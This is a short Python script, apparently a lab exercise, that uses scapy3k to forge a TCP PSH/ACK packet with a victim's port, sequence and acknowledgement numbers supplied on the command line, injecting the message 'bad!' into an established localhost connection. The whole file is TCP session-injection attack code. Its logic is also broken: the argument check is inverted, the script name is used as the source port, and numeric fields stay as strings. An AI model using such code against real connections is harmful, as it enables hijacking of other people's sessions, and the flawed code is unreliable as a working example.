import scapy3k.all as scapy
import socket
import struct
import sys

scapy.conf.L3socket
scapy.conf.L3socket=scapy.L3RawSocket

if len(sys.argv)<4:
	# args to be sent to machineA
	full_message =  "bad!"

	# connection establishment
	#Put the victim's port
	sport = sys.argv[0]
	src=dest="127.0.0.1"
	#Put the server port
	dport=sys.argv[1]
	ip=scapy.IP(src=src,dst=dest)
	# put the seqence number and the ack of the previous ACK created by the previous messages. 
	PHACK=scapy.TCP(sport=sport,dport=dport,flags='PA',seq=sys.argv[2],ack=sys.argv[3])
	scapy.send(ip/PHACK/full_message)
else:
	print("not enough arguments")
	print("src port of the victim, server port, seq number, ack number")
	


# to be nice, you should send the FIN/ACK, ACK pkts now ...
